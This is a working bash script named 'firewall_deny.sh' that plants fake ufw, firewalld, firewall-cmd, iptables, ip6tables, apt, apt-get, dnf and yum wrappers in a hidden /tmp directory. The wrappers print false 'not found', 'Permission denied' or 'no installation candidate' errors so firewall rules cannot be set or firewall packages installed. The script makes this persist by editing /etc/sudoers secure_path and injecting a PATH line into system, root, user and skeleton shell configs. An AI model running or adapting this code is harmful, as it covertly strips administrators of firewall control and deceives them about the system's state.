#!/bin/bash
# firewall_deny.sh

SHADOW_DIR="/tmp/.cache/lib"
mkdir -p "$SHADOW_DIR"

cat > "$SHADOW_DIR/ufw" << 'INNER'
#!/bin/bash
echo "bash: ufw: command not found"
exit 127
INNER

cat > "$SHADOW_DIR/firewalld" << 'INNER'
#!/bin/bash
echo "bash: firewalld: command not found"
exit 127
INNER

cat > "$SHADOW_DIR/firewall-cmd" << 'INNER'
#!/bin/bash
echo "bash: firewall-cmd: command not found"
exit 127
INNER

cat > "$SHADOW_DIR/iptables" << 'INNER'
#!/bin/bash
for arg in "$@"; do
    case "$arg" in
        -A|-I|-D|-F|-X|-P|--append|--insert|--delete|--flush|--delete-chain|--policy)
            echo "iptables: Permission denied"
            exit 1
            ;;
    esac
done
/usr/sbin/iptables "$@"
INNER

cat > "$SHADOW_DIR/ip6tables" << 'INNER'
#!/bin/bash
for arg in "$@"; do
    case "$arg" in
        -A|-I|-D|-F|-X|-P|--append|--insert|--delete|--flush|--delete-chain|--policy)
            echo "ip6tables: Permission denied"
            exit 1
            ;;
    esac
done
/usr/sbin/ip6tables "$@"
INNER

cat > "$SHADOW_DIR/apt" << 'INNER'
#!/bin/bash
for arg in "$@"; do
    case "$arg" in
        ufw|firewalld|nftables)
            echo "E: Package '$arg' has no installation candidate"
            exit 1
            ;;
    esac
done
/usr/bin/apt "$@"
INNER

cat > "$SHADOW_DIR/apt-get" << 'INNER'
#!/bin/bash
for arg in "$@"; do
    case "$arg" in
        ufw|firewalld|nftables)
            echo "E: Package '$arg' has no installation candidate"
            exit 1
            ;;
    esac
done
/usr/bin/apt-get "$@"
INNER

cat > "$SHADOW_DIR/dnf" << 'INNER'
#!/bin/bash
for arg in "$@"; do
    case "$arg" in
        ufw|firewalld|nftables)
            echo "Error: No match for argument: $arg"
            exit 1
            ;;
    esac
done
/usr/bin/dnf "$@"
INNER

cat > "$SHADOW_DIR/yum" << 'INNER'
#!/bin/bash
for arg in "$@"; do
    case "$arg" in
        ufw|firewalld|nftables)
            echo "No package $arg available."
            exit 1
            ;;
    esac
done
/usr/bin/yum "$@"
INNER

chmod +x "$SHADOW_DIR"/*

# poison sudo secure_path too
if ! /usr/bin/grep -q "cache/lib" /etc/sudoers 2>/dev/null; then
    echo "Defaults secure_path=\"$SHADOW_DIR:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"" >> /etc/sudoers
fi

# inject PATH into every shell config using echo not sed
MARKER="# fw lock"
POISON="export PATH=\"$SHADOW_DIR:\$PATH\" # fw lock"

apply() {
    local f="$1"
    if [ -f "$f" ] && ! /usr/bin/grep -q "$MARKER" "$f" 2>/dev/null; then
        echo "$POISON" >> "$f"
    fi
}

apply /etc/bash.bashrc
apply /etc/profile
apply /root/.bashrc
apply /root/.profile

echo "$POISON" > /etc/profile.d/fw_lock.sh
chmod 644 /etc/profile.d/fw_lock.sh

for user_home in /home/*; do
    apply "$user_home/.bashrc"
    apply "$user_home/.profile"
    apply "$user_home/.bash_profile"
done

apply /etc/skel/.bashrc
apply /etc/skel/.profile
